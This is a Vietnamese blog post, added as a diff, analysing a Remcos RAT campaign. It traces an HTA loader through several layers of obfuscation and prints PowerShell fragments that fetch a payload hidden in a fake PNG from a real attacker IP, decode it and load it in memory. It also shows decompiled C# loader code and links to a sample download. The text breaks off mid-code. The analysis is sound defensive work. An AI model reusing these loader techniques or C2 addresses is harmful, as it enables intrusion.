@@ -1,0 +1,703 @@
+<hr>
+<h2 id="title-‘Remcos-RAT-Tu-cong-cu-thuong-mai-den-vu-khi-hoa-trong-cac-chien-dich-tan-cong-mang-quy-mo-lon’description-Nothing-to-show-here-categories-RemcosRAT-HTML-Smugglingtag-APT-Malware-HTAabbrlink-63ed56dbdate-2026-03-06-13-11-50tags-hidden-truepassword-remcosRDAATTVT"><a href="#title-‘Remcos-RAT-Tu-cong-cu-thuong-mai-den-vu-khi-hoa-trong-cac-chien-dich-tan-cong-mang-quy-mo-lon’description-Nothing-to-show-here-categories-RemcosRAT-HTML-Smugglingtag-APT-Malware-HTAabbrlink-63ed56dbdate-2026-03-06-13-11-50tags-hidden-truepassword-remcosRDAATTVT" class="headerlink" title="title: ‘Remcos RAT: Từ công cụ thương mại đến vũ khí hóa trong các chiến dịch tấn công mạng quy mô lớn’description: Nothing to show here.categories:  - RemcosRAT  - HTML Smugglingtag:  - APT  - Malware  - HTAabbrlink: 63ed56dbdate: 2026-03-06 13:11:50tags:hidden: truepassword: remcosRDAATTVT"></a>title: ‘Remcos RAT: Từ công cụ thương mại đến vũ khí hóa trong các chiến dịch tấn công mạng quy mô lớn’<br>description: Nothing to show here.<br>categories:<br>  - RemcosRAT<br>  - HTML Smuggling<br>tag:<br>  - APT<br>  - Malware<br>  - HTA<br>abbrlink: 63ed56db<br>date: 2026-03-06 13:11:50<br>tags:<br>hidden: true<br>password: remcosRDAATTVT</h2><p>{% note purple  ‘fa-solid fa-circle-info’ %}<br>⚔️ Download sample tại {% url_for ‘Malware Bazaar’ <a href="https://bazaar.abuse.ch/download/e58aba655675d2479bebf957fb376036d34cf923c87c673031ec7cdbda0d6113/">https://bazaar.abuse.ch/download/e58aba655675d2479bebf957fb376036d34cf923c87c673031ec7cdbda0d6113/</a> %}<br>{% endnote %}</p>
+<h1 id="Mo-bai"><a href="#Mo-bai" class="headerlink" title="Mở bài"></a>Mở bài</h1><p>Hí anh em :D,</p>
+<p>Hôm nay trời Sòn Gài nắng đẹp, tao chẳng có việc gì làm nên lọ mọ ngồi phân tích mấy khứa đang cầm Remcos RAT đi phishing lung tung.</p>
+<p>Ở bài viết này, tao lấy đại 1 sample dễ nhất để phân tích :D, mong anh em thông cảm.</p>
+<hr>
+<h1 id="Tong-quan-ve-ma-doc"><a href="#Tong-quan-ve-ma-doc" class="headerlink" title="Tổng quan về mã độc"></a>Tổng quan về mã độc</h1><h2 id="Tom-tat-ma-doc"><a href="#Tom-tat-ma-doc" class="headerlink" title="Tóm tắt mã độc"></a>Tóm tắt mã độc</h2><p>Remcos RAT (tên đầy đủ là Remote Control and Surveillance) là một loại Remote Access Trojan (RAT) đã “làm mưa làm gió” trong giới tấn công mạng từ khoảng năm 2016 đến nay.<br>Ban đầu, Remcos được sinh ra như một công cụ quản trị từ xa hợp pháp do công ty Breaking Security (Đức) phát triển, bán công khai với giá vài trăm euro cho sysadmin, red team. Ai cũng nghĩ nó chỉ là tool “pro” để remote máy khách hàng thôi… Nhưng đời không như mơ, chỉ sau ít lâu, lũ threat actor đã “nhặt” luôn và biến nó thành vũ khí sắc bén cho đủ thể loại chiến dịch độc hại.<br>Gần đây, Remcos đang hồi sinh mạnh mẽ hơn bao giờ hết. Bọn hacker nâng cấp chơi chiêu tinh vi vl:</p>
+<ul>
+<li>Phishing email “xịn sò” (kiểu RFQ, shipping, hóa đơn giả…)</li>
+<li>Kỹ thuật fileless đa tầng (chạy hoàn toàn trong memory, không để file xuống đĩa)</li>
+<li>Lạm dụng triệt để các công cụ hợp pháp của Windows (PowerShell, mshta.exe, process injection, hollowing…) để né tránh antivirus và EDR.</li>
+</ul>
+<p>Với khả năng kiểm soát hoàn toàn máy nạn nhân (keylogger, screen capture, ghi âm, remote desktop, steal dữ liệu, thậm chí biến máy thành zombie…), Remcos giờ đã trở thành mối đe dọa nghiêm trọng với doanh nghiệp, tổ chức và cả anh em cá nhân luôn.</p>
+<h2 id="Boi-canh-va-qua-trinh-phat-trien"><a href="#Boi-canh-va-qua-trinh-phat-trien" class="headerlink" title="Bối cảnh và quá trình phát triển"></a>Bối cảnh và quá trình phát triển</h2><p>Remcos đang được phát triển bởi một nhóm có tên Breaking Security (<a href="https://breakingsecurity.net/">https://breakingsecurity.net/</a>) như một sản phẩm thương mại (COTS – Commercial Off-The-Shelf). Ban đầu, nó phục vụ mục đích quản trị hệ thống từ xa hợp pháp.<br>Tuy nhiên, do tính năng mạnh mẽ và dễ sử dụng, Remcos nhanh chóng được các nhóm tấn công mạng khai thác. Từ một công cụ hợp pháp, nó đã trở thành một trong những RAT phổ biến trong cả hoạt động tội phạm mạng lẫn gián điệp mạng.<br>Trong giai đoạn 2024–2026, Remcos tiếp tục tiến hóa với các xu hướng:</p>
+<ul>
+<li>Sử dụng kỹ thuật fileless (không ghi file xuống disk) </li>
+<li>Lạm dụng các công cụ sẵn có của Windows (LOLBins) </li>
+<li>Tăng cường kỹ thuật social engineering</li>
+</ul>
+<h2 id="Vector-xam-nhap-ban-dau-Initial-Access"><a href="#Vector-xam-nhap-ban-dau-Initial-Access" class="headerlink" title="Vector xâm nhập ban đầu (Initial Access)"></a>Vector xâm nhập ban đầu (Initial Access)</h2><p>Spear phishing vẫn là phương thức xâm nhập chính của Remcos.<br>Các email lừa đảo thường giả dạng:</p>
+<ul>
+<li>Hóa đơn tài chính </li>
+<li>Thông báo từ phòng nhân sự (HR) </li>
+<li>Tài liệu vận chuyển, logistics</li>
+</ul>
+<p>Các file đính kèm độc hại phổ biến:</p>
+<ul>
+<li>File Word&#x2F;Excel chứa macro </li>
+<li>File ZIP nén </li>
+<li>File LNK (shortcut) </li>
+<li>File RTF khai thác lỗ hổng</li>
+</ul>
+<p>Một số lỗ hổng thường bị khai thác:</p>
+<ul>
+<li>CVE-2017-11882 (Microsoft Equation Editor) </li>
+<li>CVE-2017-0199 (RCE qua Office)</li>
+</ul>
+<h2 id="Chuoi-lay-nhiem-Infection-chain"><a href="#Chuoi-lay-nhiem-Infection-chain" class="headerlink" title="Chuỗi lây nhiễm (Infection chain)"></a>Chuỗi lây nhiễm (Infection chain)</h2><p>Một chuỗi tấn công điển hình của Remcos gồm các bước:</p>
+<ol>
+<li>Nạn nhân nhận email phishing </li>
+<li>Mở file đính kèm độc hại </li>
+<li>File tải thêm payload từ Internet </li>
+<li>Khai thác lỗ hổng hoặc thực thi script </li>
+<li>Sử dụng PowerShell hoặc VBScript để chạy mã </li>
+<li>Payload được load trực tiếp vào bộ nhớ (fileless) </li>
+<li>Thực hiện các kĩ thuật defense evasion như: process injection, dll hijacking.</li>
+</ol>
+<p>Chuỗi tấn công nhiều lớp này giúp gia tăng đáng kể khả năng né tránh các giải pháp bảo mật truyền thống.</p>
+<h2 id="Kill-chain-–-Tu-hta-den-trien-khai-Remcos-RAT-agent"><a href="#Kill-chain-–-Tu-hta-den-trien-khai-Remcos-RAT-agent" class="headerlink" title="Kill chain – Từ .hta đến triển khai Remcos RAT agent"></a>Kill chain – Từ .hta đến triển khai Remcos RAT agent</h2><p>Trong bài viết này, tôi sẽ phân tích và bóc tách một chiến dịch tấn công thực tế, trong đó kẻ tấn công sử dụng tệp độc hại định dạng .hta làm điểm khởi đầu, từ đó triển khai chuỗi lây nhiễm dẫn đến việc cài đặt Remcos RAT agent trên hệ thống nạn nhân. Toàn bộ chuỗi lây nhiễm có thể được tóm tắt như sau:</p>
+<ol>
+<li>Người dùng mở tệp .hta độc hại. </li>
+<li>mshta.exe được gọi để thực thi script HTA. </li>
+<li>Script HTA giải mã và khởi chạy lệnh PowerShell. </li>
+<li>PowerShell tải xuống file giả dạng ảnh (optimized_MSI.png). </li>
+<li>Payload ẩn bên trong file ảnh được trích xuất và giải mã. </li>
+<li>.NET assembly được load vào memory. </li>
+<li>Assembly được thực thi thông qua kỹ thuật Reflection. </li>
+<li>Payload cuối cùng (img_043611.png) chứa Remcos RAT agent được tải về và triển khai. </li>
+<li>Remcos RAT được cài đặt và hoạt động hoàn chỉnh trên hệ thống nạn nhân.</li>
+</ol>
+<hr>
+<h1 id="Phan-tich-chi-tiet-chien-dich"><a href="#Phan-tich-chi-tiet-chien-dich" class="headerlink" title="Phân tích chi tiết chiến dịch"></a>Phân tích chi tiết chiến dịch</h1><h2 id="Mau-phan-mem-doc-hai"><a href="#Mau-phan-mem-doc-hai" class="headerlink" title="Mẫu phần mềm độc hại"></a>Mẫu phần mềm độc hại</h2><p>Mẫu phần mềm độc hại tôi phân tích trong bài được lưu trữ <a href="https://bazaar.abuse.ch/download/e58aba655675d2479bebf957fb376036d34cf923c87c673031ec7cdbda0d6113/">tại đây</a>.</p>
+<h2 id="Giai-doan-trien-khai-Loader-ban-dau"><a href="#Giai-doan-trien-khai-Loader-ban-dau" class="headerlink" title="Giai đoạn triển khai Loader ban đầu"></a>Giai đoạn triển khai Loader ban đầu</h2><h3 id="Thong-tin-tep-loader-ban-dau"><a href="#Thong-tin-tep-loader-ban-dau" class="headerlink" title="Thông tin tệp loader ban đầu"></a>Thông tin tệp loader ban đầu</h3><p>Trong chuỗi tấn công, tệp .hta đóng vai trò là <code>initial loader</code>, chịu trách nhiệm khởi tạo quá trình lây nhiễm. Sau khi được thực thi, tệp này tiến hành tải các tài nguyên từ xa và giải mã payload được nhúng sẵn, từ đó thực thi các đoạn mã tiếp theo nhằm tải xuống và triển khai Remcos RAT vào hệ thống nạn nhân.</p>
+<h3 id="Qua-trinh-boc-tach-–-lam-sach-tep-loader"><a href="#Qua-trinh-boc-tach-–-lam-sach-tep-loader" class="headerlink" title="Quá trình bốc tách – làm sạch tệp loader"></a>Quá trình bốc tách – làm sạch tệp loader</h3><h4 id="Ky-thuat-lam-roi-chuoi-lop-thu-1"><a href="#Ky-thuat-lam-roi-chuoi-lop-thu-1" class="headerlink" title="Kỹ thuật làm rối chuỗi lớp thứ 1"></a><em>Kỹ thuật làm rối chuỗi lớp thứ 1</em></h4><p>Trong quá trình phân tích tệp .hta, tôi ghi nhận tệp này chứa hơn 44.000 dòng mã vô nghĩa dưới dạng:</p>
+<pre><code class="language-html">this.Sumbwa += &quot;kataifi&quot;;
+</code></pre>
+<p>Các đoạn mã này không đóng vai trò thực thi logic mà được chèn vào nhằm:</p>
+<ul>
+<li>Làm tăng kích thước tệp một cách bất thường </li>
+<li>Gây nhiễu quá trình phân tích tĩnh (static analysis) </li>
+<li>Làm giảm hiệu quả của các công cụ tự động và sandbox.</li>
+</ul>
+<p>Đây là một kỹ thuật obfuscation phổ biến, trong đó attacker chèn một lượng lớn <strong>“junk code”</strong> để che giấu phần logic thực sự của mã độc.</p>
+<p><img src="/posts/63ed56db/image1.png" alt="Hình 1 - Các đoạn mã &lt;i&gt;this.Sumbwa +&#x3D; &quot;kataifi&quot;;&lt;&#x2F;i&gt; vô nghĩa"></p>
+<h4 id="Ky-thuat-lam-roi-chuoi-lop-thu-2"><a href="#Ky-thuat-lam-roi-chuoi-lop-thu-2" class="headerlink" title="Kỹ thuật làm rối chuỗi lớp thứ 2"></a><em>Kỹ thuật làm rối chuỗi lớp thứ 2</em></h4><p>Sau khi loại bỏ các đoạn mã gây nhiễu (kataifi), nội dung tệp được rút gọn đáng kể, giúp lộ ra phần mã thực thi chính.</p>
+<p><img src="/posts/63ed56db/image2.png" alt="Hình 2 - Đoạn mã sau khi remove kataifi"></p>
+<p>Tại hình trên, chúng ta có thể thấy giá trị của biến Yizkor được hacker sử dụng các junk code jestf vô nghĩa chèn trực tiếp vào các vị trí của đoạn mã base64.</p>
+<p><img src="/posts/63ed56db/image3.png" alt="Hình 3 - Đoạn mã phần cuối file"></p>
+<p>Kế đến, hacker sử dụng biến nuttiest nhằm lưu chuỗi lệnh đáng ngờ có vẻ liên quan đến PowerShell. Điểm đáng chú ý là lệnh PowerShell không được viết dưới dạng rõ ràng mà được che giấu bên trong một chuỗi đã bị làm rối, khiến việc phân tích trực tiếp trở nên khó khăn.</p>
+<p><strong>Kết luận sơ bộ:</strong><br>Từ các phân tích trên, tôi nhận định cơ chế làm rối chính của loader này bằng việc kết hợp các kĩ thuật junk code, string fragmentation và base64 encode. Cụ thể như sau:</p>
+<ul>
+<li>Chèn chuỗi cố định “jestf” vào giữa các ký tự → Sau khi loại bỏ “jestf”, chuỗi còn lại trở thành chuỗi base64 hợp lệ.</li>
+<li>Làm rối payload PowerShell bằng việc kết hợp 2 kĩ thuật chính, cụ thể:<ul>
+<li>Junk code: Đoạn chuỗi đầu tiên trong biến var nuttiest &#x3D; “pkataifiokataifiw…” cho tôi thấy biến này đã được chèn nhiều chuỗi kataifi vào trong.</li>
+<li>String fragmentation: Kế đến, biến này được tạo thành từ việc kết hợp chuỗi “pkataifiokataifiw…”, Yizkor và chuỗi “’)) | kataifiI…”</li>
+</ul>
+</li>
+</ul>
+<h4 id="Ky-thuat-lam-roi-chuoi-lop-thu-3"><a href="#Ky-thuat-lam-roi-chuoi-lop-thu-3" class="headerlink" title="Kỹ thuật làm rối chuỗi lớp thứ 3"></a><em>Kỹ thuật làm rối chuỗi lớp thứ 3</em></h4><p>Sau khi làm sạch đoạn mã, tôi thu được tệp lệnh PowerShell hoàn chỉnh như hình bên dưới:</p>
+<p><img src="/posts/63ed56db/image4.png" alt="Hình 4 - Đoạn code PowerShell chính"></p>
+<p>Tuy nhiên, ở tệp lệnh PowerShell này, hacker vẫn đang sử dụng kĩ thuật format string để làm rối mã</p>
+<pre><code class="language-powershell">(&quot;{2}{37}{53}...{5}&quot; -f &#39;str1&#39;,&#39;str2&#39;,&#39;str3&#39;...)
+</code></pre>
+<p>Các placeholder {2}, {37}, {53}, … sẽ được thay thế bằng các phần tử tương ứng trong danh sách phía sau ví dụ ta có format string “{2}{0}{1}” -f “A”,”B”,”C” → giá trị thực tế sẽ là “CAB”<br>Kế đến, sau khi ghép chuỗi bằng -f, payload tiếp tục được xử lý bởi chuỗi các lệnh .Replace():</p>
+<pre><code class="language-powershell">.rEplacE(([cHAr]111+[cHAr]56+[cHAr]97),[sTRInG][cHAr]92)
+.rEplacE(&#39;zY8&#39;,&#39;$&#39;)
+.rEplacE(([cHAr]77+[cHAr]50+[cHAr]98),[sTRInG][cHAr]39)
+.rEplacE(([cHAr]108+[cHAr]74+[cHAr]76),[sTRInG][cHAr]34)
+</code></pre>
+<p>Đoạn mã trên nhằm thay thế các giá trị ASCII thay vì giá trị chuỗi thực tế. Ví dụ với ([cHAr]111+[cHAr]56+[cHAr]97), ta có:</p>
+<ul>
+<li>111 → ‘o’ </li>
+<li>56 → ‘8’ </li>
+<li>97 → ‘a’<br>→ Chuỗi “o8a” được thay thế bằng ký tự \ (ASCII 92)</li>
+</ul>
+<p><strong><u>Kết luận sơ bộ:</u></strong></p>
+<p>Payload này thể hiện mức độ obfuscation cao với các đặc điểm:</p>
+<ul>
+<li>Sử dụng nhiều kỹ thuật làm rối mã đơn giản nhưng kết hợp hiệu quả </li>
+<li>Không phụ thuộc vào packer phức tạp.</li>
+<li>Tối ưu cho việc né tránh detection và phân tích.</li>
+</ul>
+<p>Đặc biệt, việc sử dụng:</p>
+<ul>
+<li>-f string formatting </li>
+<li>.Replace() với ASCII </li>
+<li>Reflection (AppDomain.Load)</li>
+</ul>
+<p>cho thấy attacker có chủ đích xây dựng một loader linh hoạt, khó bị phân tích bằng các phương pháp tự động.</p>
+<p>Sau khi giải mã lần 3, tôi ghi nhận payload PowerShell thu được cho thấy một chuỗi hành vi rõ ràng nhằm tải, giải mã và thực thi mã độc trong bộ nhớ. Đáng chú ý, toàn bộ quá trình được thiết kế để tránh ghi file trực tiếp xuống ổ đĩa, qua đó giảm thiểu khả năng bị phát hiện</p>
+<p><img src="/posts/63ed56db/image5.png" alt="Hình 5 - Payload PowerShell sau khi giải mã"></p>
+<p>Trước hết, script tiến hành xây dựng một URL từ xa bằng cách nối các ký tự riêng lẻ:</p>
+<pre><code class="language-powershell">$orientalization = &#39;h&#39;+&#39;t&#39;+&#39;t&#39;+&#39;p&#39;+...
+</code></pre>
+<p>Kỹ thuật này nhằm tránh việc URL xuất hiện dưới dạng rõ ràng trong mã nguồn, qua đó né tránh các cơ chế phát hiện dựa trên chuỗi tĩnh. URL sau khi được ghép lại trỏ tới một tài nguyên có dạng hình ảnh .png, tuy nhiên thực chất đây không phải là file hình ảnh thông thường mà chứa dữ liệu độc hại được nhúng bên trong.<br>→ Đường dẫn <a href="http://192.3.176.237/img/a/optimized_MSI.png">http://192.3.176.237/img/a/optimized_MSI.png</a> chính là nơi lưu trữ mã độc đầu tiên được loader tải xuống về máy nạn nhân.</p>
+<p>Tiếp theo, script tạo một đối tượng Net.WebClient để tải dữ liệu:</p>
+<pre><code class="language-powershell">$shields = New-Object (&quot;Net.Web&quot;+&quot;Client&quot;);
+$scratchboard = $shields.(&quot;Download&quot;+&quot;Data&quot;).Invoke($orientalization);
+</code></pre>
+<p>Dữ liệu tải về được chuyển thành chuỗi UTF-8:</p>
+<pre><code class="language-powershell">$murally = [Text.Encoding]::UTF8.GetString($scratchboard);
+</code></pre>
+<p>→ Điều này cho thấy payload được nhúng dưới dạng text-based encoded content, thay vì nhị phân thuần túy. Ở tập lệnh PowerShell này, hacker thực hiện 03 công đoạn tuần tự bao gồm:</p>
+<ol>
+<li>Trích xuất payload ẩn trong nội dung tệp tin.</li>
+<li>Giải mã và xử lý payload sau khi trích xuất.</li>
+<li>Thực thi trong bộ nhớ (In-memory execution).</li>
+</ol>
+<p><u>Công đoạn 1.</u> Trích xuất payload ẩn trong nội dung được tải về</p>
+<p>Tại đây, hacker sử dụng các marker để xác định vị trí payload:</p>
+<pre><code class="language-powershell">$cirrose = &#39;IN-&#39;;
+$coywolves = &#39;-in1&#39;;
+</code></pre>
+<p>Script tìm vị trí của hai marker này:</p>
+<pre><code class="language-powershell">$achondroplasty = $murally.IndexOf($cirrose);
+$daemonomancy = $murally.LastIndexOf($coywolves);
+</code></pre>
+<p>Trong trường hợp không tìm thấy marker → script sẽ dừng lại →  cho thấy đây là cơ chế kiểm tra tính hợp lệ của dữ liệu.</p>
+<p>Sau đó, phần dữ liệu nằm giữa hai marker được trích xuất:</p>
+<pre><code class="language-powershell">$subependymal = $murally.Substring(...);
+</code></pre>
+<p><u>Công đoạn 2.</u> Giải mã và xử lý payload sau khi trích xuất<br>Payload sau khi trích xuất tiếp tục được xử lý:</p>
+<pre><code class="language-powershell">$kivas = $subependymal.Replace(&#39;#&#39;, &#39;A&#39;).ToCharArray();
+[Array]::Reverse($kivas);
+$Isernia = $kivas -join &#39;&#39;;
+</code></pre>
+<p>Các bước bao gồm:</p>
+<ul>
+<li>Thay thế ký tự (# → A) </li>
+<li>Đảo ngược chuỗi (reverse) </li>
+<li>Ghép lại thành chuỗi hoàn chỉnh</li>
+</ul>
+<p>Sau đó, chuỗi này được decode từ Base64:</p>
+<pre><code class="language-powershell">[byte[]]$kanten = [Convert]::FromBase64String($Isernia);
+</code></pre>
+<p><u>Công đoạn 3.</u> Thực thi trong bộ nhớ (In-memory execution)</p>
+<p>Payload sau khi decode không được ghi ra file mà được load trực tiếp vào bộ nhớ:</p>
+<pre><code class="language-powershell">$gorals = [AppDomain]::CurrentDomain.Load($kanten);
+</code></pre>
+<p>Sau đó, script sử dụng reflection để gọi phương thức:</p>
+<pre><code class="language-powershell">$sulphotelluride = $gorals.GetType(&#39;Fiber.Program&#39;);
+$oxanorbornenyl = $sulphotelluride.GetMethod(&#39;Main&#39;);
+$oxanorbornenyl.Invoke($null, [object[]]$Limon);
+</code></pre>
+<p>→ Điều này cho thấy:</p>
+<ul>
+<li>Payload là một .NET assembly </li>
+<li>Được load trực tiếp bằng AppDomain.Load </li>
+<li>Thực thi thông qua phương thức Main</li>
+</ul>
+<p>Bên cạnh đó, tôi phát hiện được tổng cộng <strong>19 tham số</strong> được truyền vào payload này bao gồm:</p>
+<pre><code class="language-powershell">$Limon = @(
+  &#39;http://192.3.176.237/100/img_043611.png&#39;,
+  &#39;&#39;,
+  &#39;C:\Users\Public\Downloads\&#39;,
+  &#39;Name_File&#39;,
+  &#39;Caspol&#39;,
+  &#39;&#39;,
+  &#39;Caspol&#39;,
+  &#39;&#39;,
+  &#39;URL&#39;,
+  &#39;C:\Users\Public\Downloads\&#39;,
+  &#39;Name_File&#39;,
+  &#39;hta&#39;,
+  &#39;1&#39;,
+  &#39;&#39;,
+  &#39;Task_Name&#39;,
+  &#39;0&#39;,
+  &#39;&#39;,
+  &#39;&#39;,
+  &#39;&#39;
+)
+</code></pre>
+<h4 id="Ket-luan-dieu-tra-cua-giai-doan-loader"><a href="#Ket-luan-dieu-tra-cua-giai-doan-loader" class="headerlink" title="Kết luận điều tra của giai đoạn loader"></a><em>Kết luận điều tra của giai đoạn loader</em></h4><p>Sau khi phân tích toàn bộ tệp .hta, tôi thấy rằng đây là một <strong>loader nhiều hành vi (multi-stage loader)</strong> được thiết kế nhằm triển khai mã độc theo hướng fileless malware, kết hợp nhiều kỹ thuật obfuscation để né tránh phát hiện.</p>
+<p>Cụ thể, khi người dùng thực thi tệp .hta, hệ thống sẽ gọi mshta.exe để chạy script bên trong. Script này sau đó tiến hành khôi phục và thực thi một lệnh PowerShell đã bị làm rối thông qua nhiều lớp obfuscation. Lệnh PowerShell đóng vai trò là cầu nối, tiếp tục tải và xử lý payload ở giai đoạn tiếp theo. Trong bước tiếp theo, PowerShell sẽ kết nối tới máy chủ từ xa tại: <a href="http://192.3.176.237/img/a/optimized_MSI.png">http://192.3.176.237/img/a/optimized_MSI.png</a></p>
+<p>Tài nguyên này được ngụy trang dưới dạng một file hình ảnh .png, tuy nhiên thực chất chứa dữ liệu mã hóa. Sau khi tải về, script tiến hành:</p>
+<ul>
+<li>Chuyển dữ liệu hình ảnh <strong>PNG</strong> thành chuỗi.</li>
+<li>Trích xuất payload dựa trên các <strong>marker</strong> định sẵn </li>
+<li>Thực hiện các bước giải mã (thay thế ký tự, đảo chuỗi, decode Base64)</li>
+</ul>
+<p>Payload sau khi được giải mã là một <strong>.NET assembly</strong>, được load trực tiếp vào bộ nhớ thông qua AppDomain.Load mà không ghi xuống ổ đĩa. Việc thực thi được thực hiện bằng reflection thông qua phương thức Main, cho phép mã độc hoạt động hoàn toàn trong môi trường memory.</p>
+<p>Đáng chú ý rằng, payload này tiếp tục thực hiện kết nối tới một tài nguyên khác tại đường dẫn <a href="http://192.3.176.237/100/img_043611.png">http://192.3.176.237/100/img_043611.png</a>. Tệp tin này nhiều khả năng đóng vai trò là payload giai đoạn cuối hoặc thành phần bổ sung, được sử dụng để hoàn tất quá trình cài đặt và thực thi mã độc.</p>
+<h2 id="Phan-tich-ma-doc-giai-doan-2-–-ma-doc-optimized-MSI-png"><a href="#Phan-tich-ma-doc-giai-doan-2-–-ma-doc-optimized-MSI-png" class="headerlink" title="Phân tích mã độc giai đoạn 2 – mã độc optimized_MSI.png"></a>Phân tích mã độc giai đoạn 2 – mã độc optimized_MSI.png</h2><p>Trong phần trước, tôi đã xác định rằng tệp <strong>.hta</strong> ban đầu đóng vai trò là loader giai đoạn 1, có nhiệm vụ khởi tạo và thực thi PowerShell để tải dữ liệu từ máy chủ điều khiển. Một trong những tài nguyên quan trọng được tải về là tệp <strong>optimized_MSI.png</strong> từ hạ tầng của attacker.</p>
+<p>Mặc dù mang định dạng hình ảnh (định dạng .png), phân tích cho thấy tệp này thực chất không phải là nội dung đồ họa hợp lệ mà đóng vai trò như một container chứa payload mã độc đã được mã hóa. Việc sử dụng định dạng hình ảnh giúp attacker ngụy trang lưu lượng mạng và tránh bị phát hiện bởi các cơ chế kiểm tra dựa trên loại file.</p>
+<p>Trong phần này, tôi tiến hành phân tích chi tiết tệp <strong>optimized_MSI.png</strong>, tập trung vào cách dữ liệu được nhúng, cơ chế trích xuất payload, cũng như phương pháp giải mã và thực thi trong bộ nhớ.</p>
+<h3 id="Boc-tach-ma-doc-optimized-MSI-png"><a href="#Boc-tach-ma-doc-optimized-MSI-png" class="headerlink" title="Bóc tách mã độc optimized_MSI.png"></a>Bóc tách mã độc optimized_MSI.png</h3><p>Khi tải xuống tệp hình ảnh, tôi bất ngờ khi có thể xem được nội dung hình ảnh bên trong.</p>
+<pre><code>IN-=#### … ##QqVT-in1
+</code></pre>
+<p><img src="/posts/63ed56db/image6.png" alt="Hình 6 - Hình nền MSI"></p>
+<p>Tuy nhiên, đoạn payload được đính kèm tinh vi bằng cặp chuỗi <strong>IN-</strong> và <strong>-in1</strong></p>
+<p><img src="/posts/63ed56db/image7.png" alt="Hình 7 - Hình ảnh mô tả payload được ẩn giấu trong tệp tin hình ảnh"></p>
+<p>Sau khi giải mã payload, tôi nhận được file .dll thật sự và được code bằng <code>C#</code></p>
+<p><img src="/posts/63ed56db/image8.png" alt="Hình 8 - Một phần nội dung file .dll"></p>
+<p>Sau khi decompile, tôi tìm đến hàm Main và tiến hành phân tích</p>
+<p><img src="/posts/63ed56db/image9.png" alt="Hình 9 - Một phần nội dung hàm Main"></p>
+<pre><code class="language-c#">public static void Main(string encodedUrlPayload, string flagRegStartup, string vbsPath, string vbsName, string clrPath, string nativeDllPath, string nativeDllName, string flagTaskPersistence, string payloadUrl, string outputPath, string outputName, string fileExt, string intervalMinutes, string flagStartupTask, string schedulerTaskName, string vmDetectionName, string flagUacStart, string uacPayloadUrl, string uacCommand)
+{
+	for (;;)
+	{
+		int num = \uE430.\uE050(9);
+		for (;;)
+		{
+			num ^= \uE430.\uE050(4);
+			if (99 &lt;= 12)
+			{
+				goto Block_14;
+			}
+			switch (num)
+			{
+			case 5:
+			{
+				bool flag;
+				if (!flag)
+				{
+					goto IL_96;
+				}
+				if (126 &lt;= -86)
+				{
+					goto Block_16;
+				}
+				num = 11;
+				continue;
+			}
+			case 6:
+				\uE001\uF152.\uEF37((SecurityProtocolType)\uE430.\uE050(680));
+				if (90 &lt;= 27)
+				{
+					goto Block_17;
+				}
+				num = 5;
+				continue;
+			case 7:
+				num = \uE430.\uE050(46);
+				continue;
+			case 8:
+			{
+				bool flag = \uF119.\uEF37(flagTaskPersistence, \uE42F.\uE04C(171400));
+				if (-115 &gt;= -17)
+				{
+					goto Block_18;
+				}
+				num = 7;
+				continue;
+			}
+			case 9:
+				goto IL_93;
+			}
+			break;
+		}
+		if (-69 &gt;= 32)
+		{
+			goto Block_15;
+		}
+	}
+	IL_93:
+	bool flag2 = false;
+	goto IL_99;
+	IL_96:
+	flag2 = true;
+	IL_99:
+	if (!flag2)
+	{
+		\uE001\uF153.\uEF37(intervalMinutes, payloadUrl, outputPath, outputName, fileExt, schedulerTaskName);
+	}
+	bool flag3 = \uF119.\uEF37(flagStartupTask, \uE42F.\uE04C(171400));
+	if (flag3)
+	{
+		\uE001\uF154.\uEF37(intervalMinutes, payloadUrl, outputPath, outputName, fileExt, schedulerTaskName);
+	}
+	bool flag4 = \uF119.\uEF37(flagRegStartup, \uE42F.\uE04C(171400));
+	if (flag4)
+	{
+		\uE001\uF155.\uEF37(vbsPath, vbsName, fileExt);
+	}
+	bool flag5 = \uF119.\uEF37(vmDetectionName, \uE42F.\uE04C(171400));
+	if (flag5)
+	{
+		\uE001\uF156.\uEF37();
+	}
+	bool flag6 = ((!\uF119.\uEF37(flagUacStart, \uE42F.\uE04C(171400))) ? \uE430.\uE050(0) : (\uE001\uF157.\uEF37() ? 1 : 0)) != 0;
+	if (flag6)
+	{
+		\uE001\uF158.\uEF37();
+	}
+	Block_14:
+	Block_15:
+	Block_16:
+	Block_17:
+	Block_18:
+	try
+	{
+		WebClient webClient = \uE001\uF159.\uEF37();
+		byte[] array;
+		try
+		{
+			array = \uE001\uF15A.\uEF37(webClient, encodedUrlPayload);
+		}
+		finally
+		{
+			if (webClient != null)
+			{
+				\uEF5E.\uEF37(webClient);
+			}
+		}
+		string text = \uE001\uE145.\uEF37(\uF833.\uEF37(), array);
+		string text2;
+		int num3;
+		int num4;
+		for (;;)
+		{
+			int num2 = \uE430.\uE050(0);
+			for (;;)
+			{
+				switch (num2 ^ \uE430.\uE050(66))
+				{
+				case 11:
+					text2 = \uE42F.\uE04C(171231);
+					num2 = 7;
+					continue;
+				case 12:
+				{
+					string text3 = \uE42F.\uE04C(171112);
+					num2 = 4;
+					continue;
+				}
+				case 13:
+				{
+					string text3;
+					num3 = \uE001\uF15B.\uEF37(text, text3);
+					num2 = 5;
+					continue;
+				}
+				case 14:
+					if (num4 != -1)
+					{
+						num2 = 27;
+						continue;
+					}
+					goto IL_276;
+				case 15:
+					num4 = \uEF4B.\uEF37(text, text2);
+					num2 = \uE430.\uE050(12);
+					continue;
+				case 16:
+					goto IL_26F;
+				}
+				break;
+			}
+		}
+		IL_26F:
+		bool flag7 = num3 == -1;
+		goto IL_27C;
+		IL_276:
+		flag7 = (\uE430.\uE050(1) != 0);
+		IL_27C:
+		bool flag8 = flag7;
+		if (!flag8)
+		{
+			int num5 = num4 + \uF10F.\uEF37(text2);
+			string text4;
+			for (;;)
+			{
+				int num6 = \uE430.\uE050(13);
+				for (;;)
+				{
+					num6 ^= \uE430.\uE050(8);
+					switch (num6 + 3)
+					{
+					case 0:
+						num6 = -5;
+						continue;
+					case 1:
+					{
+						char[] array2;
+						text4 = \uE000\uF1F9.\uEF37(array2);
+						num6 = \uE430.\uE050(12);
+						continue;
+					}
+					case 2:
+					{
+						char[] array2;
+						\uE001\uF15C.\uEF37(array2);
+						num6 = -8;
+						continue;
+					}
+					case 3:
+					{
+						string text5;
+						char[] array2 = \uE000\uE384.\uEF37(text5);
+						num6 = -6;
+						continue;
+					}
+					case 4:
+					{
+						string text6;
+						string text5 = \uF1B4.\uEF37(text6, \uE42F.\uE04C(171092), \uE42F.\uE04C(171088));
+						num6 = 5;
+						continue;
+					}
+					case 5:
+					{
